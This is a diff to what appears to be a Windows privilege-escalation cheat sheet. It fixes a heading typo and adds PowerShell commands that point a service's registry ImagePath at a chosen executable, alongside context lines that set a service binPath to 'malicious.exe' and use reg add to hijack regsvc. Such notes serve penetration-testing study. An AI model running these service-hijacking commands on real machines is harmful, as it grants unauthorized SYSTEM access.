@@ -152,7 +152,7 @@ sc.exe config <SERVICE> binPath="C:\Users\Quickemu\Downloads\malicious.exe"
 sc.exe create <SERVICE-NAME> binPath="<PATH-TO-EXECUTABLE>"
 ```
 
-## 💠Weak Permissins on Service💠 
+## 💠Weak Permissions on Service💠 
 
  Use the `accesschk64' program to check if we have privileges over that process.
 
@@ -222,7 +222,7 @@ C:\Users\Quickemu\Downloads\Example Directory\Another.exe
 C:\Users\Quickemu\Downloads\Example.exe
 ```
 
-## 💠Weak Registry Permissions💠 
+## 💠Weak Registry Permissions (service)💠 
 ```
 🔺Is SERVICE_START_NAME = LocalSystem? -> SYSTEM Privileges?
 sc.exe qc <SERVICE>
@@ -235,6 +235,11 @@ reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND
 
 🔺Start
 net start regsvc
+
+
+ 🔺🔺 Modify the imagePath entry of a service using the registry
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\simpleService" -Name ImagePath -Value "C:\Users\Quickemu\Downloads\simpleService.exe"
+Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\simpleService"
 ```
 
 ## 💠Service ImagePath💠
